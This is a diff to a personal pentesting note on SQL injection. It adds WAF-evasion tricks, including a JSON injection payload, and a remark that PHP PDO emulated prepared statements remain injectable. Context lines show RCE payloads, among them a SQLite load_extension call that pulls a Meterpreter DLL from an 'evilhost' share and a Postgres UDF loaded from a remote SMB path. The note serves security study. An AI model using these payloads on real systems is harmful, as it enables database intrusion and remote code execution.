@@ -342,6 +342,10 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
+### Avoid spaces
+
+- You can use comments: `/**/`
+- You can use new lines: `{"serialnumber":"'or\n@@version\nlimit 1\noffset 123#"}` [^2]
 
 ### Abusing JSON-Based SQL to Bypass WAF
 Original article: [{JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf); Team82 Research
@@ -366,6 +370,12 @@ SQLite:
 
 [sqlmap](../Tools/sqlmap.md) evasion filter: `sqlmap --tamper json_waf_bypass_postgres.py`
 
+### Injection in PHP PDO prepared statements
+
+In [PHP](../Dev,%20scripting%20&%20OS/PHP.md), if [PDO Preparaed Statements](../Dev,%20scripting%20&%20OS/PHP%20PDO.md#PDO%20Preparaed%20Statements) are used and emulation is enabled, [MySQL](../Services/MySQL.md) and [PostgreSQL](../Services/PostgreSQL.md) become vulnerable to SQL Injection even if prepared statements are used: 
+
+![Adam Kues - Novel SQL Injection Technique in PDO Prepared Statements](../../Clippings/Adam%20Kues%20-%20Novel%20SQL%20Injection%20Technique%20in%20PDO%20Prepared%20Statements.md#^9102b3)
+
 ---
 
 ## RCE using SQLite command
@@ -383,7 +393,7 @@ UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
 ## RCE loading extensions (Postgres UDF)
 
 >[!warning]
->The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamically library file is not loaded into an incompatible server. If the target library doesn’t have this magic block (as is the case with all standard system libraries), then the loading process will fail.
+>The compiled extension we want to load must define an appropriate [PostgreSQL](../Services/PostgreSQL.md) structure (magic block) to ensure that a dynamically library file is not loaded into an incompatible server. If the target library doesn’t have this magic block (as is the case with all standard system libraries), then the loading process will fail.
 
 ```sql
 # Load an external extension
@@ -405,6 +415,7 @@ CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.16
 SELECT remote_test($$calc.exe$$, 3);
 ```
 
+
 ## Tools for SQLi
 
 - [sqlmap](../Tools/sqlmap.md)
@@ -412,7 +423,7 @@ SELECT remote_test($$calc.exe$$, 3);
 - [BlindBrute](https://github.com/c3llkn1ght/BlindBrute) [^blindbrute]
 
 [^blindbrute]: [Erik - Last Week in Security (LWiS) - 2024-11-12](../../Readwise/Articles/Erik%20-%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-11-12.md#^bd17a3)
-## External Resources
+## Other Resources
 
 - [pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
 - [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
@@ -421,6 +432,9 @@ SELECT remote_test($$calc.exe$$, 3);
 - [From MSSQL to RCE](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
 - [PayloadsAllTheThings/SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
 - [Advanced SQL Injection Techniques by nav1n0x](https://nav1n0x.gitbook.io/advanced-sql-injection-techniques?__readwiseLocation=)
-- [[SQL Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md) in OEM (BT-WAF Bypass)](../../Readwise/Articles/Spaceraccoon's%20Blog%20-%20Pwning%20Millions%20of%20Smart%20Weighing%20Machines%20With%20API%20and%20Hardware%20Hacking.md#[SQL%20Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md)%20in%20OEM%20(BT-WAF%20Bypass))
+- [Pwning Millions of Smart Weighing Machines With API and Hardware Hacking](../../Readwise/Articles/Spaceraccoon's%20Blog%20-%20Pwning%20Millions%20of%20Smart%20Weighing%20Machines%20With%20API%20and%20Hardware%20Hacking.md)
+- [Mehmet Ince - Inside PostHog How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain (ZDI-25-099, ZDI-25-097, ZDI-25-096)](../../Clippings/Mehmet%20Ince%20-%20Inside%20PostHog%20How%20SSRF,%20a%20ClickHouse%20SQL%20Escaping%200day,%20and%20Default%20PostgreSQL%20Credentials%20Formed%20an%20RCE%20Chain%20(ZDI-25-099,%20ZDI-25-097,%20ZDI-25-096).md)
 
 [^1]: [Out-of-Band Exfiltration Tools](../../Readwise/Articles/Piyush%20Kumawat%20(securitycipher)%20-%20Out-of-Band%20Exfiltration%20Tools.md)
+
+[^2]: [Spaceraccoon's Blog - Pwning Millions of Smart Weighing Machines With API and Hardware Hacking](../../Readwise/Articles/Spaceraccoon's%20Blog%20-%20Pwning%20Millions%20of%20Smart%20Weighing%20Machines%20With%20API%20and%20Hardware%20Hacking.md)
